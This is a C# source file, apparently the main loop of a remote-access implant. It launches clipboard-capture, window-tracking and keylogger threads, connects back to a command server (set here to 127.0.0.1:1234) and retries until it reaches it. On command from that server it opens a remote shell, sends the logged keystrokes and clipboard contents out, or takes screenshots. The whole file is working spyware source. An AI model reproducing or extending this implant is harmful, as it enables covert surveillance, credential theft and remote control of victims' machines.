using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using Implant.Modules;
using System.Threading.Channels;

namespace Implant {

    internal class Program {
        
        const int BUFFER_SIZE = 2048;
        private Socket socket;
        private bool running = true;

        private Channel<string> channel;

        private Thread clipperThread;
        private Thread wintrackerThread;
        private Thread keyloggerThread;

        public static void Main(string[] args) {
            Program p = new Program();
            p.setup();
            p.run();
        }

        public void setup() {
            // Channel options
            var channelOptions = new BoundedChannelOptions(1000) { FullMode = BoundedChannelFullMode.DropOldest };
            channel = Channel.CreateBounded<string>(channelOptions);
            
            // Start clipper
            clipperThread = new Thread(() => Clipper.run(channel));
            clipperThread.Start();
            
            // Start window tracker
            wintrackerThread = new Thread(() => Wintracker.run(channel));
            wintrackerThread.Start();
            
            // Start window keylogger
            keyloggerThread = new Thread(() => Keylogger.run(channel));
            keyloggerThread.Start();
        }

        public void run() {
            while (running) {
                try {
                    loop();
                }
                // If anything happens to the socket, retry every 10 seconds
                catch (Exception) {
                    Thread.Sleep(10000);
                    Console.WriteLine("[*] Trying to connect to server ...");
                }
            }
        }
        
        private void loop() {

            // Socket creation
            IPAddress server_ip = IPAddress.Parse("127.0.0.1");
            IPEndPoint ipe = new IPEndPoint(server_ip, 1234);
            socket = new Socket(server_ip.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
            
            // Connection to server
            socket.Connect(ipe);
            Console.WriteLine($"[+] Connection to {socket.RemoteEndPoint} opened\n");

            // Main implant loop
            string msg;
            while (true) {
                
                // Listen on the socket
                byte[] b = new byte[BUFFER_SIZE];
                Array.Clear(b, 0, BUFFER_SIZE);

                try {
                    socket.Receive(b);
                }
                catch (Exception) {
                    Console.WriteLine("[-] Socket timed out or closed, resetting");
                    throw;
                }
                
                msg = Encoding.UTF8.GetString(b).TrimEnd('\0');
                Console.WriteLine(msg);
                
                // Message parsing and dispatch to concerned functions
                if (msg.Equals("shell")) {
                    Console.WriteLine("[+] Starting shell\n");
                    Shell.run(socket);
                }
                else if (msg.Equals("exfiltrate")) {
                    Console.WriteLine("[+] Retrieve keylogger\n");

                    string res;
                    while (channel.Reader.TryRead(out res)) {
                        socket.Send(Encoding.UTF8.GetBytes(res));
                        Thread.Sleep(500);
                    }
                    
                    Thread.Sleep(3000);
                    socket.Send(Encoding.UTF8.GetBytes("end"));
                }
                else if (msg.Equals("screenshot")) {
                    Console.WriteLine("[+] Taking screenshot\n");
                    Screenshot.screenshot(socket);
                }
                else if (msg.Equals("close")) {
                    Console.WriteLine($"[+] Connection with {socket.RemoteEndPoint} close\n");
                    socket.Close();
                }
                else if (msg.Equals("ping"))
                    socket.Send(Encoding.UTF8.GetBytes("pong"));
            }
        }
    }
}